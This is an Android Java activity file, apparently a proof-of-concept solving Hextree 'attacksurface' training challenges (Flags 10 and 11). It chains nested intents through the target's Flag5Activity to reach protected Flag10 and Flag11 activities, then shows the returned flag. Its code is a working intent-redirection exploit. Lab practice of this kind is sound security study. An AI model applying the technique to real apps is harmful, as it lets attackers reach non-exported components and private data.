package com.xylinz.poc;

import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class ImplicitIntent extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_implicit_intent);

         // Flag 10 - Implicit Intent with Flag

        Button flag10 = findViewById(R.id.flag10_button);

        Intent tiga = new Intent();
        tiga.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag10Activity");
        tiga.putExtra("reason", "next");

        Intent dua = new Intent();
        dua.putExtra("return", 42);
        dua.putExtra("nextIntent", tiga);

        Intent satu = new Intent();
        satu.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag5Activity");
        satu.putExtra("android.intent.extra.INTENT", dua);

        flag10.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivity(satu);
            }
        });

        // Receive Flag 10
        Intent flag = getIntent();
        String flagnya = flag.getStringExtra("flag");
        TextView tempatFlag = findViewById(R.id.string_flagImplicit);
        tempatFlag.setText(flagnya);

         // Flag 11 - Respond to Implicit Intent

        Button flag11 = findViewById(R.id.flag11_button);

        Intent iga = new Intent();
        iga.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag11Activity");
        iga.putExtra("reason", "next");

        Intent ua = new Intent();
        ua.putExtra("return", 42);
        ua.putExtra("nextIntent", iga);

        Intent atu = new Intent();
        atu.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag5Activity");
        atu.putExtra("android.intent.extra.INTENT", ua);

        flag11.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivity(atu);
            }
        });
    }
}